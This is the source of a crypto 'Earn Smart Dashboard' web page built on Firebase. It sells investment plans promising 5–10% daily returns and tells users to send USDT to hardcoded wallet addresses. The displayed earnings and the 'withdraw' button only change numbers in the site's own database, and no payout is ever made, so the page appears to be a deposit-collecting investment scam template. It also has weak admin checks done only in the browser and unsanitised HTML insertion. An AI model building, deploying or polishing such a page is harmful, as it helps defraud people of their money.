<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Earn Smart Dashboard</title>

<style>
body{
margin:0;
font-family:'Segoe UI',sans-serif;
background:linear-gradient(135deg,#0f172a,#1e293b,#0f172a);
color:white;
overflow-x:hidden;
}
.container{max-width:1100px;margin:auto;padding:20px;}
.card{
background:rgba(255,255,255,0.05);
backdrop-filter:blur(15px);
padding:20px;
border-radius:15px;
margin-bottom:20px;
box-shadow:0 0 25px rgba(0,255,150,0.1);
}
h2,h3{margin-top:0;}
button{
padding:10px 15px;
border:none;
border-radius:8px;
cursor:pointer;
font-weight:bold;
margin-top:10px;
}
.green{background:#22c55e;color:white;}
.red{background:#ef4444;color:white;}
.blue{background:#3b82f6;color:white;}
input,select{
width:100%;
padding:10px;
margin:6px 0;
border-radius:8px;
border:none;
}
.wallet{
background:#111827;
padding:10px;
border-radius:8px;
word-break:break-all;
margin:10px 0;
}
.hidden{display:none;}

.dollar{
position:fixed;
top:-50px;
color:#22c55e;
font-size:20px;
animation:fall linear infinite;
opacity:0.3;
}
@keyframes fall{
to{transform:translateY(110vh);}
}
</style>
</head>
<body>

<script>
for(let i=0;i<30;i++){
let s=document.createElement("span");
s.className="dollar";
s.innerText="$";
s.style.left=Math.random()*100+"vw";
s.style.animationDuration=(4+Math.random()*6)+"s";
document.body.appendChild(s);
}
</script>

<div class="container">

<h2>ðŸ’° Earn Smart Dashboard</h2>

<div class="card">
<h3>Profile ID: <span id="uid"></span></h3>
<h3>Balance: $<span id="balance">0.00</span></h3>
<h3>Active Earnings: $<span id="earnings">0.00</span></h3>
</div>

<!-- INVESTMENT PLANS -->
<div class="card">
<h3>Investment Plans</h3>

<select id="plan">
<option value="">Select Plan</option>
<option value="starter">Starter - $5 (5% Daily 30 Days)</option>
<option value="silver">Silver - $10 (5% Daily 30 Days)</option>
<option value="diamond">Diamond - $20 (10% Daily 30 Days)</option>
</select>

<select id="network">
<option value="">Select Network</option>
<option value="trc20">USDT TRC20</option>
<option value="bsc">BEP20 BSC</option>
<option value="erc20">ERC20 ETH</option>
</select>

<button class="blue" onclick="showWallet()">Generate Deposit Address</button>

<div id="depositBox" class="hidden">
<div class="wallet" id="walletAddress"></div>
<p id="amountText"></p>
<input type="number" id="depositAmount" placeholder="Enter Amount Sent">
<button class="green" onclick="submitDeposit()">Submit Deposit</button>
</div>
</div>

<!-- ACTIVATE -->
<div class="card">
<h3>Activate Investment</h3>
<button class="green" onclick="activateInvestment()">Activate</button>
</div>

<!-- WITHDRAW -->
<div class="card">
<h3>Withdraw (Available After 30 Days)</h3>
<button class="green" onclick="withdraw()">Withdraw</button>
</div>

<!-- REFERRAL -->
<div class="card">
<h3>Referral</h3>
<p>Your Referral ID:</p>
<div class="wallet" id="refId"></div>
</div>

<!-- ADMIN -->
<div id="adminPanel" class="card hidden">
<h3>Admin Panel - Approve Deposits</h3>
<div id="deposits"></div>
</div>

</div>

<script type="module">

import { auth, db } from './firebase.js';
import { ref, set, get, update, push, onValue }
from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

const ADMIN_EMAIL="admin@email.com";

let selectedPlan="";
let requiredAmount=0;
let wallet="";

auth.onAuthStateChanged(async user=>{
if(!user){location="index.html";return;}

document.getElementById("uid").innerText=user.uid;
document.getElementById("refId").innerText=user.uid;

const userRef=ref(db,'users/'+user.uid);
let snap=await get(userRef);

if(!snap.exists()){
await set(userRef,{
balance:0,
earnings:0,
investment:null
});
}

onValue(userRef,s=>{
let data=s.val();
document.getElementById("balance").innerText=(data.balance||0).toFixed(2);
document.getElementById("earnings").innerText=(data.earnings||0).toFixed(2);

calculateProfit(user.uid,data);
});

if(user.email===ADMIN_EMAIL){
document.getElementById("adminPanel").classList.remove("hidden");
loadDeposits();
}
});

/* SHOW WALLET */
window.showWallet=()=>{
selectedPlan=document.getElementById("plan").value;
let net=document.getElementById("network").value;

if(!selectedPlan||!net) return alert("Select plan & network");

if(selectedPlan==="starter") requiredAmount=5;
if(selectedPlan==="silver") requiredAmount=10;
if(selectedPlan==="diamond") requiredAmount=20;

if(net==="trc20") wallet="TKJAvkyjdDSzKtS1HihiKno1tTfi2bTJJe";
if(net==="bsc") wallet="0xB66E1e0e5452489298bebd7Cd463587E6866baD2";
if(net==="erc20") wallet="0xB66E1e0e5452489298bebd7Cd463587E6866baD2";

document.getElementById("walletAddress").innerText=wallet;
document.getElementById("amountText").innerText="Send exactly $"+requiredAmount;
document.getElementById("depositBox").classList.remove("hidden");
};

/* SUBMIT DEPOSIT */
window.submitDeposit=async()=>{
let user=auth.currentUser;
let amt=parseFloat(document.getElementById("depositAmount").value);

if(amt!==requiredAmount) return alert("Incorrect amount");

await push(ref(db,'deposits'),{
uid:user.uid,
amount:amt,
plan:selectedPlan,
status:"pending",
date:Date.now()
});

alert("Deposit submitted. Wait for approval.");
};

/* ADMIN APPROVAL */
function loadDeposits(){
onValue(ref(db,'deposits'),snap=>{
let data=snap.val();
let html="";
for(let id in data){
let d=data[id];
if(d.status==="pending"){
html+=`
<div>
User: ${d.uid}<br>
Amount: $${d.amount}<br>
<button onclick="approve('${id}','${d.uid}',${d.amount},'${d.plan}')" class="green">Approve</button>
</div><hr>`;
}
}
document.getElementById("deposits").innerHTML=html;
});
}

window.approve=async(id,uid,amount,plan)=>{
let userRef=ref(db,'users/'+uid);
let snap=await get(userRef);
let bal=snap.val().balance||0;

await update(userRef,{balance:bal+amount});
await update(ref(db,'deposits/'+id),{status:"approved"});
alert("Approved");
};

/* ACTIVATE INVESTMENT */
window.activateInvestment=async()=>{
let user=auth.currentUser;
let userRef=ref(db,'users/'+user.uid);
let snap=await get(userRef);
let data=snap.val();

if(data.balance<requiredAmount)
return alert("Deposit not approved yet");

await update(userRef,{
balance:data.balance-requiredAmount,
investment:{
amount:requiredAmount,
plan:selectedPlan,
start:Date.now(),
days:0
}
});

alert("Investment Activated");
};

/* AUTO PROFIT EVERY 24 HOURS */
async function calculateProfit(uid,data){
if(!data.investment) return;

let inv=data.investment;
let now=Date.now();
let days=Math.floor((now-inv.start)/(1000*60*60*24));

if(days>inv.days && days<=30){
let daily=0;
if(inv.plan==="starter") daily=0.25;
if(inv.plan==="silver") daily=0.5;
if(inv.plan==="diamond") daily=2;

let newEarn=data.earnings+daily;

await update(ref(db,'users/'+uid),{
earnings:newEarn,
'investment/days':days
});
}
}

/* WITHDRAW AFTER 30 DAYS */
window.withdraw=async()=>{
let user=auth.currentUser;
let userRef=ref(db,'users/'+user.uid);
let snap=await get(userRef);
let data=snap.val();

if(!data.investment) return alert("No investment");

let days=Math.floor((Date.now()-data.investment.start)/(1000*60*60*24));

if(days<30) return alert("Withdrawal allowed after 30 days");

let total=data.earnings+data.investment.amount;

await update(userRef,{
balance:data.balance+total,
earnings:0,
investment:null
});

alert("Withdrawal Successful");
};

</script>
</body>
  </html>
